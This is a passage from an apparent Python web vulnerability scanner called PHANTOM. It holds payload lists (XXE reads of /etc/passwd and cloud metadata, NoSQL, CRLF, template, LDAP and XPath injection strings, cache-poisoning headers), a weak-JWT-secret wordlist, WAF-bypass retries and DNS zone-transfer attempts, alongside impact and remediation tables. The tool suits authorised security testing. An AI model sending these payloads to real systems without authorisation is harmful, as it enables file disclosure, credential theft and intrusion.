    "X-Frame-Options":             {"desc":"Clickjacking protection","risk":"HIGH",  "rec":"DENY"},
    "X-XSS-Protection":            {"desc":"Browser XSS filter",    "risk":"MEDIUM","rec":"1; mode=block"},
    "X-Content-Type-Options":      {"desc":"MIME sniffing block",    "risk":"MEDIUM","rec":"nosniff"},
    "Strict-Transport-Security":   {"desc":"Forces HTTPS (HSTS)",    "risk":"HIGH",  "rec":"max-age=31536000; includeSubDomains"},
    "Content-Security-Policy":     {"desc":"XSS/injection policy",   "risk":"HIGH",  "rec":"default-src 'self'"},
    "Referrer-Policy":             {"desc":"Referrer control",        "risk":"LOW",   "rec":"strict-origin-when-cross-origin"},
    "Permissions-Policy":          {"desc":"Browser feature ctrl",   "risk":"LOW",   "rec":"geolocation=(), microphone=()"},
    "Cross-Origin-Opener-Policy":  {"desc":"Cross-origin isolation",  "risk":"MEDIUM","rec":"same-origin"},
    "Cross-Origin-Embedder-Policy":{"desc":"Embedding restriction",  "risk":"MEDIUM","rec":"require-corp"},
    "Cross-Origin-Resource-Policy":{"desc":"Resource sharing ctrl",  "risk":"MEDIUM","rec":"same-origin"},
    "Expect-CT":                   {"desc":"Cert transparency",       "risk":"LOW",   "rec":"max-age=86400, enforce"},
}
TOP_PORTS=[21,22,23,25,53,80,110,143,443,445,1433,3000,3306,3389,4000,5000,
           5432,5672,5900,6379,8000,8080,8081,8083,8088,8443,8888,9000,9090,
           9200,9300,10000,11211,27017,50000]
DANGEROUS_PORTS={23:"Telnet",6379:"Redis",27017:"MongoDB",9200:"Elasticsearch",
                 11211:"Memcached",8888:"Jupyter"}
VERSION_CVE={
    r"OpenSSH[_/ ]([\d.]+)":[((7,4),"CVE-2016-6515 DoS"),((8,5),"CVE-2021-28041"),((9,6),"CVE-2023-51385 RCE")],
    r"Apache[/ ]([\d.]+)":  [((2,4,51),"CVE-2021-41773 path traversal"),((2,4,56),"CVE-2023-25690")],
    r"nginx[/ ]([\d.]+)":   [((1,21,0),"CVE-2021-23017 buffer overwrite"),((1,25,3),"CVE-2023-44487")],
    r"PHP/([\d.]+)":         [((7,4,0),"CVE-2019-11043 RCE"),((8,0,0),"CVE-2021-21707")],
}
XXE_PAYLOADS=[
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>',
]
XXE_INDICATORS=["root:x:","bin:x:","daemon:x:","ami-id","instance-id"]
GRAPHQL_INTRO="{__schema{types{name fields{name}}}}"
GRAPHQL_DEEP="{user{friends{friends{friends{id name}}}}}"
CACHE_HEADERS=[("X-Forwarded-Host","evil-phantom-test.com"),("X-Forwarded-Scheme","http"),
               ("X-Original-URL","/admin"),("X-Rewrite-URL","/admin"),
               ("Forwarded","host=evil-phantom-test.com"),("X-Host","evil-phantom-test.com")]
WP_PATHS=["/wp-json/wp/v2/users","/wp-json/wp/v2/posts","/wp-content/plugins/",
          "/?author=1","/?author=2","/wp-login.php?action=register",
          "/readme.html","/license.txt","/xmlrpc.php"]
JOOMLA_PATHS=["/administrator/","/configuration.php~","/joomla.xml",
              "/CHANGELOG.php","/administrator/manifests/files/joomla.xml"]
DRUPAL_PATHS=["/CHANGELOG.txt","/core/CHANGELOG.txt","/update.php",
              "/?q=admin","/node/1","/sites/default/files/","/misc/drupal.js"]
SUBDOMAIN_WORDS=["admin","api","app","auth","beta","blog","cdn","ci","cloud","cms",
    "dashboard","data","db","dev","docs","email","ftp","git","help","internal",
    "jenkins","jira","lab","login","mail","manage","mobile","monitor","mysql",
    "old","panel","prod","redis","s3","secure","shop","smtp","ssh","stage",
    "staging","static","store","support","test","tools","upload","vault","vpn","wiki","www2"]

# ══ EXTRA PAYLOADS (new modules) ══════════════════════════════════════════════
NOSQL_PAYLOADS=["'||'1'=='1","'; return true; var x='","[$ne]=1","[$gt]=",
    '{"$gt":""}','{"$ne":null}','{"$where":"sleep(3000)"}',"%27%7c%7c%271%27%3d%3d%271"]
NOSQL_ERRORS=["mongodb","mongoose","unexpected token","bson","$where","casterror",
              "e11000","cannot read property"]
CRLF_PAYLOADS=["%0d%0aPhantom-Crlf:injected","%0aPhantom-Crlf:injected",
    "%0d%0aSet-Cookie:phantomcrlf=1","%E5%98%8A%E5%98%8DPhantom-Crlf:injected"]
# Fingerprints for dangling 3rd-party services (subdomain takeover)
TAKEOVER_FINGERPRINTS={
    "GitHub Pages":"there isn't a github pages site here",
    "Heroku":"no such app",
    "AWS S3":"the specified bucket does not exist",
    "Shopify":"sorry, this shop is currently unavailable",
    "Fastly":"fastly error: unknown domain",
    "Pantheon":"the gods are wise, but do not know of the site",
    "Tumblr":"whatever you were looking for doesn't currently exist",
    "Surge.sh":"project not found",
    "Bitbucket":"repository not found",
    "Unbounce":"the requested url was not found on this server",
    "Ghost":"the thing you were looking for is no longer here",
    "Cargo":"<title>404 &mdash; file not found</title>",
    "Webflow":"the page you are looking for doesn't exist or has been moved",
    "Netlify":"not found - request id",
}
# JavaScript sinks/sources that indicate DOM-based XSS
DOM_XSS_SINKS=["innerhtml","outerhtml","document.write","document.writeln",
    "insertadjacenthtml",".html(","eval(","settimeout(","setinterval(",
    "new function(","location.href","location.replace","location.assign",
    "window.open","$(","jquery"]
DOM_XSS_SOURCES=["location.search","location.hash","location.href","document.url",
    "document.referrer","document.cookie","window.name","localstorage","sessionstorage",
    "postmessage"]
# Deserialization magic markers in responses/cookies
DESER_MARKERS={
    "PHP Object":r"O:\d+:\"[A-Za-z0-9_\\]+\":\d+:\{",
    "Java Serialized (b64)":r"rO0AB[A-Za-z0-9+/=]+",
    "Java Serialized (hex)":r"aced0005",
    "Python Pickle":r"\\x80\\x04|\\x80\\x03|c__builtin__",
    ".NET ViewState":r"__VIEWSTATE",
    "Ruby Marshal":r"\\x04\\x08",
}
HTTP_METHODS_TEST=["OPTIONS","PUT","DELETE","TRACE","TRACK","CONNECT","PATCH","PROPFIND"]
LOG4SHELL_HEADERS=["User-Agent","Referer","X-Api-Version","X-Forwarded-For"]

# ── Round-2 payloads ──────────────────────────────────────────────────────────
# Unique arithmetic marker (7*73*11*... unlikely to occur naturally): 1337*1337=1787569
SSTI_MARKER="1787569"
SSTI_TEMPLATE_PAYLOADS=["{{1337*1337}}","{1337*1337}","<%= 1337*1337 %>","@(1337*1337)",
    "#set($x=1337*1337)$x","{{= 1337*1337}}","[[1337*1337]]"]
EL_PAYLOADS=["${1337*1337}","#{1337*1337}","%{1337*1337}","${{1337*1337}}","#{1337*1337}",
    "%{(1337*1337)}","T(java.lang.Math).max(1787568,1787569)"]
XPATH_PAYLOADS=["' or '1'='1","') or ('1'='1","' or 1=1 or ''='","x' or name()='username' or 'x'='y",
    "']|//*|//user['"]
XPATH_ERRORS=["xpath","xpathexception","sablotron","xmldom","libxml","unclosed token",
    "expression must evaluate","syntaxerror.*xpath"]
LDAP_PAYLOADS=["*","*)(uid=*))(|(uid=*","*)(&","*))%00","admin)(|(password=*)","*)(objectClass=*"]
LDAP_ERRORS=["javax.naming","ldap","invalid dn syntax","com.sun.jndi","supplied argument is not a valid ldap",
    "protocol error","invalidsearchfilter","bad search filter"]
BACKUP_EXTS=["~",".bak",".old",".orig",".save",".swp",".swo",".tmp",".copy",".1",
    ".backup",".zip",".tar.gz",".tar",".rar",".7z","%7E"]
SOURCE_EXTS=[".php~",".php.bak",".php.old",".inc",".java",".cs",".rb~",".py~",".jsp.bak",".asp.bak"]
STORED_XSS_MARKER="phantomStoredXSS7q9"
EMAIL_TEST_USERS=["admin","administrator","test","root","user","support"]
WEAK_JWT_SECRETS=["secret","secretkey","secret123","password","admin","key","jwt","token",
    "changeme","123456","qwerty","s3cr3t","mysecret","supersecret","jwtsecret","your-256-bit-secret",
    "test","dev","private","signature","HS256","default","app","api","auth","sign","verysecret"]
HIDDEN_PARAMS=["debug","test","admin","is_admin","isadmin","role","access","edit","preview",
    "show","display","mode","env","source","raw","internal","beta","feature","override","bypass"]
VULN_IMPACT={
    "SQL Injection":"Full DB compromise — read/modify/delete, RCE via INTO OUTFILE",
    "SQL Injection (Form)":"Full DB compromise via form input",
    "XXE Injection":"Read server files, SSRF to internal/cloud services, DoS",
    "HTTP Request Smuggling":"Session hijacking, cache poisoning, request desync",
    "SSTI":"Remote Code Execution via template engine",
    "LFI":"Read server files, chain to RCE via log poisoning",
    "LFI Config Read":"Config decoded — credentials exposed",
    "Command Injection":"OS command execution — full system compromise",
    "SSRF":"Access cloud metadata, internal network pivot",
    "Reflected XSS":"Session hijacking, credential theft, keylogger injection",
    "Reflected XSS (Form)":"XSS via form — session theft",
    "GraphQL Introspection":"Full API schema exposed — all endpoints enumerable",
    "GraphQL DoS":"Deeply nested query causes server CPU exhaustion",
    "Web Cache Poisoning":"Malicious response served to all users",
    "HTTP Parameter Pollution":"WAF/logic bypass via duplicate params",
    "Business Logic Flaw":"Price manipulation, auth bypass, privilege escalation",
    "OAuth Misconfiguration":"Account takeover via redirect_uri or state forgery",
    "WordPress Vulnerability":"CMS exploit: user enum, plugin RCE, XML-RPC abuse",
    "Drupal Vulnerability":"Drupalgeddon/RCE via known Drupal CVEs",
    "Joomla Vulnerability":"Joomla RCE via exposed admin or known CVEs",
    "Default Credentials":"Admin access via unchanged default username/password",
    "WebSocket Vulnerability":"Cross-site WS hijacking or message injection",
    "SSL/TLS Weakness":"Downgrade attack (POODLE/BEAST), traffic decryption",
    "Rate Limiting Missing":"Brute-force, enumeration, API abuse possible",
    "CSP Weakness":"XSS via CSP bypass, data exfiltration possible",
    "Subdomain Found":"Extended attack surface — dev servers, shadow IT",
    "CORS Misconfiguration":"Cross-origin API calls — full account takeover",
    "Sensitive File Exposed":"Credentials, source code, or DB dumps exposed",
    "Admin Panel Found":"Admin interface exposed — brute-force risk",
    "Clickjacking":"UI redressing — unintended action trick",
    "CSRF Missing Token":"Forged authenticated requests on behalf of victims",
    "Insecure Cookie":"Session token theft via MITM, XSS, or CSRF",
    "JWT Issue":"JWT tampering — privilege escalation, session forgery",
    "Missing Header (HIGH)":"Enables clickjacking, XSS, downgrade attacks",
    "Missing Header (MEDIUM)":"Reduces security defence-in-depth",
    "Info Disclosure":"Tech stack exposed — enables targeted attacks",
    "Open Port (Dangerous)":"Dangerous service exposed — likely unauthenticated",
    "Unauthenticated Redis":"All Redis keys readable/writable without auth",
    "FTP Anonymous Login":"Unauthenticated file access",
    "Unauthenticated Elasticsearch":"All indices accessible without credentials",
    "Unauthenticated MongoDB":"Database collections accessible without auth",
    "DNS Zone Transfer":"All subdomains enumerated",
    "Outdated Service CVE":"Known exploitable vulnerability in service version",
    "Open Redirect":"Phishing via trusted domain, OAuth redirect bypass",
    "API Key Exposed":"Direct third-party service access — financial/data loss",
    "IDOR":"Access other users data — privilege escalation",
    "Stack Trace Leaked":"Framework/path info — aids targeted attacks",
    "Proto Pollution":"JavaScript prototype pollution — DoS or RCE in Node.js",
    "NoSQL Injection":"Auth bypass and data extraction via MongoDB operator injection",
    "Host Header Injection":"Password-reset poisoning, cache poisoning, web-cache deception",
    "CRLF Injection":"HTTP response splitting — header injection, XSS, cache poisoning",
    "Subdomain Takeover":"Attacker claims dangling subdomain — full content control, cookie theft",
    "DOM XSS":"Client-side XSS via unsafe JavaScript sink — session/credential theft",
    "Insecure Deserialization":"Remote Code Execution via crafted serialized object",
    "Dangerous HTTP Method":"PUT/DELETE enabled — file upload, defacement, resource deletion",
    "Cross-Site Tracing (XST)":"TRACE method reflects headers — bypass HttpOnly, steal cookies",
    "Directory Listing":"Auto-index exposes file tree — source, backups, configs browsable",
    "Mixed Content":"HTTP assets on HTTPS page — MITM injection, downgrade",
    "Email Spoofing (SPF/DMARC)":"Missing SPF/DMARC — domain phishing and email forgery possible",
    "Open Cloud Storage":"Public S3/GCS/Azure bucket — data leak or content tampering",
    "Log4Shell (JNDI)":"CVE-2021-44228 — RCE via JNDI lookup in log4j",
    "Reverse Tabnabbing":"target=_blank without noopener — phishing via window.opener",
    "Cacheable Sensitive Page":"Private page cached by proxy/CDN — data leaks to other users",
    "WebSocket Vulnerability":"Cross-site WebSocket hijacking or unauthenticated WS access",
    "Missing security.txt":"No RFC 9116 security.txt — slows responsible disclosure",
    "XPath Injection":"Bypass XML/XPath auth, extract entire XML data store",
    "LDAP Injection":"Auth bypass and directory enumeration via LDAP filter injection",
    "Expression Language Injection":"Remote Code Execution via SpEL/OGNL/EL evaluation",
    "Stored XSS":"Persistent script runs for every visitor — mass session/credential theft",
    "User Enumeration":"Valid usernames leaked via response differences — aids brute-force",
    "Unrestricted File Upload":"Upload web shell — Remote Code Execution and full server compromise",
    "Backup File Exposed":"Editor/VCS backup leaks source code, credentials and logic",
    "Source Code Disclosure":"Server-side source revealed — secrets and logic exposed",
    "Web Cache Deception":"Trick cache into storing a victim's private page for the attacker",
    "Session Fixation":"Attacker fixes a session ID then rides the victim's authenticated session",
    "Weak JWT Secret":"HMAC secret cracked — forge any token, full account/role takeover",
    "Hidden Parameter":"Undocumented parameter alters behaviour — debug/admin features reachable",
    "Forced Browsing":"Protected page reachable without authentication — access-control bypass",
    "Verbose Error Disclosure":"Stack trace leaks framework, paths and queries — aids exploitation",
    "Blind SSRF (OOB)":"Server fetched an attacker URL out-of-band — internal pivot, metadata theft",
    "Out-of-Band RCE":"Injected command executed and called back — confirmed remote code execution",
    "Blind XXE (OOB)":"XML parser resolved an external entity out-of-band — file read / SSRF",
    "Stateful Logic Flaw":"Multi-step flow bypassed — skip payment/verification, replay, sequence abuse",
    "API Misconfiguration":"API exposes data or debug without auth — broken object/function-level access",
    "Mass Assignment":"Client can set protected fields (role/is_admin) — privilege escalation",
    "Excessive Data Exposure":"API returns sensitive fields (password/token) the client shouldn't see",
    "HTTP Method Override":"Method-override header lets attacker reach DELETE/PUT via POST",
    "Vulnerable Code Pattern":"Dangerous sink/secret in the page's own source — XSS, redirect or leak",
    "Dangerous Binary Pattern":"Risky call/secret found by static reverse-engineering of a shipped artifact",
}
VULN_FIX={
    "SQL Injection":["Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=%s',(id,))","Apply strict input whitelist","Enforce least-privilege DB user"],
    "XXE Injection":["Disable external entity processing: libxml_disable_entity_loader(true)","Use SimpleXML with LIBXML_NOENT disabled","Validate XML schema before parsing"],
    "HTTP Request Smuggling":["Reject ambiguous requests at frontend","Normalize Content-Length/Transfer-Encoding","Update to HTTP/2 end-to-end"],
    "GraphQL Introspection":["Disable introspection in production","Implement query depth limiting","Add query cost analysis","Rate-limit GraphQL endpoint"],
    "Reflected XSS":["HTML-encode output: htmlspecialchars($v,ENT_QUOTES,'UTF-8')","Implement strict Content-Security-Policy","Use framework auto-escaping"],
    "SSTI":["Never pass raw user input to template.render()","Use Jinja2 SandboxedEnvironment","Whitelist allowed template variables"],
    "LFI":["Never use user input in file functions","Whitelist allowed paths","Disable allow_url_include in php.ini"],
    "SSRF":["Whitelist allowed outbound domains","Block RFC-1918 at network level","Use IMDSv2 for AWS metadata"],
    "Web Cache Poisoning":["Strip unrecognized headers before caching","Set Cache-Control: no-store on sensitive pages","Validate Host header strictly"],
    "HTTP Parameter Pollution":["Accept only first occurrence of each parameter","Reject requests with duplicate parameters"],
    "Business Logic Flaw":["Validate all values server-side","Implement proper state machine","Add server-side business rule enforcement"],
    "OAuth Misconfiguration":["Validate redirect_uri against strict whitelist","Enforce state parameter","Use PKCE for public clients"],
    "SSL/TLS Weakness":["Disable SSLv2/3, TLS 1.0/1.1","Enable TLS 1.2+ only","Disable weak ciphers (RC4, DES, 3DES)","Implement HSTS"],
    "Rate Limiting Missing":["Implement rate limiting: Flask-Limiter, Nginx limit_req","Add CAPTCHA on login","Use exponential backoff"],
    "CSP Weakness":["Remove unsafe-inline and unsafe-eval","Use nonces or hashes instead","Add report-uri for violation monitoring"],
    "CORS Misconfiguration":["Set ACAO to explicit trusted domain list","Never reflect Origin blindly","Avoid ACAC:true with wildcard"],
    "Sensitive File Exposed":["Move files outside webroot","Block via .htaccess: Deny from all","Add .env to .gitignore"],
    "Clickjacking":["Add: X-Frame-Options: DENY","Add: Content-Security-Policy: frame-ancestors 'none'"],
    "CSRF Missing Token":["Add random CSRF token to all POST forms","Validate server-side every request"],
    "Insecure Cookie":["Set-Cookie: name=val; Secure; HttpOnly; SameSite=Strict"],
    "Missing Header (HIGH)":["Apache: Header always set X-Frame-Options DENY","Nginx: add_header X-Frame-Options DENY;","Express: use helmet()"],
    "Open Redirect":["Whitelist allowed redirect URLs","Never redirect to user-supplied URLs"],
    "API Key Exposed":["Rotate compromised key immediately","Use environment variables","Scan with trufflehog pre-commit"],
    "Command Injection":["Never pass input to shell_exec/system/exec","Use subprocess with array args (shell=False)"],
    "WordPress Vulnerability":["Keep WordPress core and plugins updated","Disable xmlrpc.php if unused","Use security plugin like Wordfence"],
    "Default Credentials":["Change all default passwords immediately","Implement account lockout after failed attempts","Use password manager for all service credentials"],
    "NoSQL Injection":["Cast user input to expected type before querying","Use parameterized queries / ODM schema validation","Reject query operators ($gt,$ne,$where) in user input"],
    "Host Header Injection":["Use a server-side allow-list of valid Host values","Never build URLs (reset links) from the Host header","Set an explicit ServerName / canonical host"],
    "CRLF Injection":["Strip \\r and \\n from all user input used in headers","Use framework header APIs that reject newlines","URL-encode redirect and cookie values"],
    "Subdomain Takeover":["Remove dangling DNS records pointing to deprovisioned services","Claim the resource before deleting the cloud service","Monitor CNAMEs for unresolved targets"],
    "DOM XSS":["Avoid innerHTML/document.write with untrusted data","Use textContent or trusted-types","Sanitize with DOMPurify before insertion"],
    "Insecure Deserialization":["Never deserialize untrusted data","Use signed/encrypted tokens or plain JSON","Apply integrity checks (HMAC) on serialized blobs"],
    "Dangerous HTTP Method":["Disable WebDAV / PUT / DELETE unless required","Restrict methods at the web-server or WAF level","Return 405 for unsupported verbs"],
    "Cross-Site Tracing (XST)":["Disable the TRACE method (TraceEnable Off)","Block TRACE/TRACK at the proxy/WAF"],
    "Directory Listing":["Disable auto-index (Options -Indexes / autoindex off)","Add an index file to each directory","Restrict directory access"],
    "Mixed Content":["Serve all assets over HTTPS","Add Content-Security-Policy: upgrade-insecure-requests","Audit hard-coded http:// asset URLs"],
    "Email Spoofing (SPF/DMARC)":["Publish a strict SPF record (-all)","Add a DMARC policy (p=reject/quarantine)","Enable DKIM signing"],
    "Open Cloud Storage":["Block public ACLs and bucket policies","Enable S3 Block Public Access","Require authentication / signed URLs"],
    "Log4Shell (JNDI)":["Upgrade log4j to 2.17.1+","Set log4j2.formatMsgNoLookups=true","Remove the JndiLookup class from the classpath"],
    "Reverse Tabnabbing":["Add rel=\"noopener noreferrer\" to target=_blank links","Set window.opener=null when opening new tabs"],
    "Cacheable Sensitive Page":["Set Cache-Control: no-store, private on authenticated pages","Add Pragma: no-cache","Never cache personalised responses at the CDN"],
    "WebSocket Vulnerability":["Validate the Origin header on the WS handshake","Authenticate every WebSocket connection","Use wss:// (TLS) only"],
    "Missing security.txt":["Publish /.well-known/security.txt per RFC 9116","Include a security contact and disclosure policy"],
    "XPath Injection":["Use parameterized XPath / precompiled queries","Whitelist and escape user input","Avoid building XPath from raw strings"],
    "LDAP Injection":["Escape LDAP special chars per RFC 4515","Use the framework's LDAP encoding API","Bind with a least-privilege service account"],
    "Expression Language Injection":["Never evaluate user input as an expression","Disable SpEL/OGNL on untrusted data","Patch Struts/Spring to fixed versions"],
    "Stored XSS":["Output-encode stored data on render","Sanitize on input with an allow-list","Enforce a strict Content-Security-Policy"],
    "User Enumeration":["Return identical messages for invalid user vs password","Use constant-time responses","Rate-limit and CAPTCHA the login/reset flows"],
    "Unrestricted File Upload":["Validate type by content, not extension","Store uploads outside webroot and rename","Disable script execution in the upload directory"],
    "Backup File Exposed":["Remove editor/VCS backups from the webroot","Block ~ .bak .old .swp via server config","Add them to deployment ignore lists"],
    "Source Code Disclosure":["Ensure handlers execute, not serve, source","Block source extensions at the web server","Move logic outside the document root"],
    "Web Cache Deception":["Don't cache based on extension alone","Honour Cache-Control on dynamic responses","Match Content-Type to cache rules"],
    "Session Fixation":["Regenerate the session ID on login","Reject client-supplied session IDs","Set Secure/HttpOnly/SameSite on session cookies"],
    "Weak JWT Secret":["Use a long, random, high-entropy signing key","Prefer RS256/ES256 over HS256","Rotate secrets and reject alg:none"],
    "Hidden Parameter":["Remove debug/admin parameters from production","Enforce server-side authorization on every feature","Audit parameter handling"],
    "Forced Browsing":["Enforce authentication and authorization server-side","Never rely on hidden URLs for protection","Default-deny on protected routes"],
    "Verbose Error Disclosure":["Disable debug mode in production","Return generic error pages","Log details server-side only"],
    "Blind SSRF (OOB)":["Allow-list outbound destinations","Block link-local/RFC-1918 ranges","Use IMDSv2 and disable unused URL fetchers"],
    "Out-of-Band RCE":["Never pass input to a shell","Use parameterized subprocess calls (shell=False)","Patch the vulnerable component immediately"],
    "Blind XXE (OOB)":["Disable external entity & DTD processing","Use a hardened XML parser","Validate/normalise XML before parsing"],
    "Stateful Logic Flaw":["Enforce server-side state machines for each flow","Verify every prior step before the next","Make critical actions idempotent and re-validated"],
    "API Misconfiguration":["Require auth on every API route","Implement object & function-level authorization","Disable debug/introspection in production"],
    "Mass Assignment":["Bind only an explicit allow-list of fields","Reject unknown/protected keys","Separate read and write DTOs"],
    "Excessive Data Exposure":["Return only fields the client needs","Filter sensitive attributes server-side","Use response schemas / serializers"],
    "HTTP Method Override":["Disable X-HTTP-Method-Override / _method handling","Enforce real-method authorization checks"],
    "Vulnerable Code Pattern":["Replace the dangerous sink with a safe API (textContent, trusted-types)","Never hard-code secrets in client code","Serve assets over HTTPS only"],
    "Dangerous Binary Pattern":["Remove embedded secrets from shipped artifacts","Avoid unsafe native calls / weak crypto","Strip debug symbols and source maps from production builds"],
}


# ══ SCAN JOB ══════════════════════════════════════════════════════════════════
class ScanJob:
    PHASES = ["Phase 0: OSINT & Recon","Phase 1: Port Scan","Phase 2: Spider & JS","Phase 3: Vulns & Exploits"]
    def __init__(self, url):
        self.id          = str(uuid.uuid4())[:8]
        self.url         = url.rstrip("/")
        self.host        = urlparse(url).hostname or url
        self.status      = "running"
        self.logs        = deque(maxlen=300)
        self.vulns       = []
        self.ports       = []
        self.urls        = set()
        self.forms       = []
        self.js_files    = set()
        self.secrets     = []
        self.chains      = []
        self.subdomains  = []
        self.tech_stack  = []
        self.csp_analysis= {}
        self.ssl_info    = {}
        self.waf_info    = {}
        self.progress    = 0
        self.current_phase = "Initializing"
        self.phase_prog  = {p: {"done": 0, "total": 1} for p in self.PHASES}
        self.start       = time.time()
        self.elapsed     = 0
        self._lock       = threading.Lock()
        self._vcnt       = 0
        self._ua         = 0
        self._delay      = DELAY
        self._lat        = []
        self.deadline    = self.start + SCAN_BUDGET
        self.mutator     = AdaptiveMutator()
        self.oob_token   = self.id + uuid.uuid4().hex[:8]
        self.oob_events  = []
        self.api_info    = {}

    def over_budget(self):
        return time.time() > self.deadline

    def log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        with self._lock:
            self.logs.append({"ts": ts, "msg": str(msg)[:140], "level": level})

    def chain(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        with self._lock:
            self.chains.append({"ts": ts, "msg": msg})
        self.log(f"CHAIN: {msg}", "CHAIN")

    def add_vuln(self, vtype, location, param="", payload="", evidence="", extracted=None, chain_type="", code=""):
        cvss_score, cvss_vec, cvss_sev = CVSS.score(vtype)
        impact = VULN_IMPACT.get(vtype, "Security issue detected")
        fix    = VULN_FIX.get(vtype, ["Review and remediate this vulnerability"])
        with self._lock:
            self._vcnt += 1
            det = evidence[:120]
            if det and det in [v["evidence"] for v in self.vulns]:
                return
            self.vulns.append({
                "id":          f"VULN-{self._vcnt:03d}",
                "type":        vtype,
                "severity":    cvss_sev,
                "cvss":        cvss_score,
                "cvss_vector": cvss_vec,
                "location":    location[:80],
                "parameter":   param,
                "payload":     payload[:80],
                "evidence":    evidence[:150],
                "extracted":   extracted or {},
                "impact":      impact,
                "fix":         fix,
                "chain_type":  chain_type,
                "code":        code[:600],   # the exact vulnerable snippet ("kaha issue hai")
                "poc":         "",           # filled by the PoC generator
            })
        self.log(f"[{cvss_sev}|{cvss_score}] {vtype} @ {location[:45]}", "VULN")

    def set_phase(self, name, total=10):
        self.current_phase = name
        with self._lock:
            self.phase_prog[name] = {"done": 0, "total": max(total, 1)}

    def advance(self, phase, by=1):
        with self._lock:
            if phase in self.phase_prog:
                pp = self.phase_prog[phase]
                pp["done"] = min(pp["done"] + by, pp["total"])
        td = sum(p["done"] for p in self.phase_prog.values())
        ta = sum(p["total"] for p in self.phase_prog.values())
        self.progress = int((td / max(ta, 1)) * 100)

    def counts(self):
        c = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        with self._lock:
            for v in self.vulns:
                c[v["severity"]] = c.get(v["severity"], 0) + 1
        return c

    def done(self):
        self.status        = "done"
        self.progress      = 100
        self.current_phase = "Complete"
        self.elapsed       = round(time.time() - self.start, 1)

    def req(self, url, method="GET", waf_bypass=False, **kw):
        h = {
            "User-Agent":    UAS[self._ua % len(UAS)],
            "Accept":        "text/html,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Connection":    "keep-alive",
        }
        # Merge caller-supplied headers instead of colliding with the defaults
        h.update(kw.pop("headers", None) or {})
        # Let callers override redirect behaviour without a kwarg collision
        allow_redirects = kw.pop("allow_redirects", True)
        self._ua += 1
        for attempt in range(2):
            try:
                t0 = time.time()
                r  = requests.request(method, url, headers=h, timeout=TIMEOUT,
                                      verify=False, allow_redirects=allow_redirects, **kw)
                lat = time.time() - t0
                self._lat.append(lat)
                if len(self._lat) > 10: self._lat.pop(0)
                avg = sum(self._lat) / len(self._lat)
                self._delay = min(DELAY + max(0, avg - 0.5) * 0.1, 2.0)
                time.sleep(self._delay)
                if r.status_code == 403 and waf_bypass and attempt == 0:
                    if "params" in kw:
                        kw["params"] = {k: quote(str(v)) for k, v in kw["params"].items()}
                    continue
                return r
            except Exception:
                return None
        return None


# ══ PHASE 0: OSINT, DNS, WAF, SUBDOMAIN ENUM ═════════════════════════════════
def phase_osint(job):
    job.set_phase("Phase 0: OSINT & Recon", 8)
    job.log(f"PHANTOM v{VER} — Target: {job.url}", "INFO")

    # IP resolution
    try:
        ip = socket.gethostbyname(job.host)
        job.log(f"IP: {ip}", "OK")
    except:
        job.log("Cannot resolve hostname", "WARN")
    job.advance("Phase 0: OSINT & Recon")

    # DNS records
    if DNS_OK:
        for rtype in ["A", "MX", "NS", "TXT", "CNAME", "SOA"]:
            try:
                ans = dns.resolver.resolve(job.host, rtype)
                for r in ans:
                    job.log(f"DNS {rtype}: {r}", "OK")
            except:
                pass
        # Zone transfer attempt
        try:
            ns_recs = dns.resolver.resolve(job.host, "NS")
            for ns in ns_recs:
                try:
                    z = dns.zone.from_xfr(dns.query.xfr(str(ns), job.host))
                    if z:
                        job.log(f"ZONE TRANSFER SUCCESS from {ns}!", "VULN")
                        job.add_vuln("DNS Zone Transfer", str(ns),
                                     evidence="AXFR returned full zone data — all subdomains exposed")
                except:
                    pass
        except:
            pass
    job.advance("Phase 0: OSINT & Recon")

    # WHOIS
    if WHOIS_OK:
        try:
            w = wh.whois(job.host)
            if w.registrar: job.log(f"Registrar: {w.registrar}", "OK")
            if w.creation_date: job.log(f"Created: {w.creation_date}", "OK")
        except:
            pass
    job.advance("Phase 0: OSINT & Recon")

    # WAF fingerprint
    waf_result = WAF_ENGINE.detect(job.url, job)
    job.waf_info = waf_result
    job.advance("Phase 0: OSINT & Recon")

    # Subdomain enumeration via crt.sh (public certificate transparency)
    _enum_subdomains_crtsh(job)
    job.advance("Phase 0: OSINT & Recon")

    # DNS brute-force subdomains
    _enum_subdomains_dns(job)
    job.advance("Phase 0: OSINT & Recon")

    # Server header recon
    try:
        r = requests.get(job.url, headers={"User-Agent": UAS[0]}, timeout=TIMEOUT, verify=False)
        for lh in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator", "X-Runtime"]:
            if lh in r.headers:
                v = r.headers[lh]
                job.log(f"{lh}: {v} — version/tech leaked", "WARN")
                job.add_vuln("Info Disclosure", job.url,
                             evidence=f"{lh}: {v} — technology version exposed")
        # Detect framework from response
        body = r.text.lower()
        tech_map = {
            "WordPress":  ["wp-content", "wp-includes"],
            "Laravel":    ["laravel_session", "XSRF-TOKEN"],
            "Django":     ["csrfmiddlewaretoken", "__admin__"],
            "React":      ["__reactfiber", "_reactrootcontainer"],
            "Vue.js":     ["vue-app", "__vue"],
            "Angular":    ["ng-version", "ng-app"],
            "Express.js": ["x-powered-by: express"],
            "Ruby Rails": ["x-runtime", "_rails_session"],
            "Spring":     ["x-application-context", "jsessionid"],
            "Drupal":     ["drupal", "sites/default/files"],
            "Joomla":     ["joomla", "/components/com_"],
        }
        for tech, sigs in tech_map.items():
            ctx = body + str(r.headers).lower()
            if any(s in ctx for s in sigs):
                if tech not in job.tech_stack:
                    job.tech_stack.append(tech)
                    job.log(f"Framework: {tech} detected", "OK")
    except:
        pass
    job.advance("Phase 0: OSINT & Recon", 2)


def _enum_subdomains_crtsh(job):
    """Query crt.sh (public Certificate Transparency) — no API key needed."""
    try:
        r = requests.get(
            f"https://crt.sh/?q=%.{job.host}&output=json",
            timeout=10, headers={"User-Agent": UAS[0]}
        )
        if r.status_code != 200:
            return
        entries = r.json()
        found   = set()
        for e in entries:
            names = e.get("name_value", "").splitlines()
            for name in names:
